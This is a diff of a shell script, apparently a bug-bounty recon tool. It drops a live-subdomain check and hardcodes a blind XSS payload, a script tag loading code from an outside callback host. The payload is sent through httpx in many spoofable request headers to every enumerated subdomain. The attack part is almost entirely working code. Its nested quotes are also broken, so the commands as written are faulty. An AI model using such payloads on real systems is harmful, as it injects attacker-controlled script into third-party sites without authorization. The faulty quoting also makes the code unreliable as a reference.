@@ -27,22 +27,15 @@ wc -l <  $1subdomain.txt
  echo "enumeration subdomain  successfully  " 
 sleep 1
 
-#subdomain live
-
-httpx -l $1subdomain.txt >> $1LIVE.txt
-
-wc -l < $1LIVE.txt 
-
- echo " subdomainlive   successfully  " 
-
-sleep 1
 
 #blindxss
-curl -LO https://raw.githubusercontent.com/husseinphp/blindxss/main/bxss-payload.txt
-while read bxss;
-do  httpx -l $1LIVE.txt  -H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" -H "cf-connecting-ip: $bxss" 
+
+
+httpx -l $1subdomain.txt -H "X-Forwarded-for: "><script src=https://husseinphp23.xss.ht></script>" -H "X-forwarded-ip: "><script src=https://husseinphp23.xss.ht></script>" -H "cf-connecting-ip: "><script src=https://husseinphp23.xss.ht></script>"
+
 sleep 1
-httpx -l $1LIVE.txt  -H "X-Client-ip: $bxss" -H "X-real-ip: $bxss" -H "X-request-uri: $bxss" \  -H "X-XSRF-TOKEN: $bxss" -H "X-CSRF-TOKEN: $bxss" 
-done < bxss-payload.txt
+
+httpx -l $1subdomain.txt  -H "X-Client-ip: "><script src=https://husseinphp23.xss.ht></script>" -H "X-real-ip: "><script src=https://husseinphp23.xss.ht></script>" -H "X-request-uri: "><script src=https://husseinphp23.xss.ht></script>" \  -H "X-XSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>" -H "X-CSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"
+
 
  echo " BLIND XSS  successfully  " 
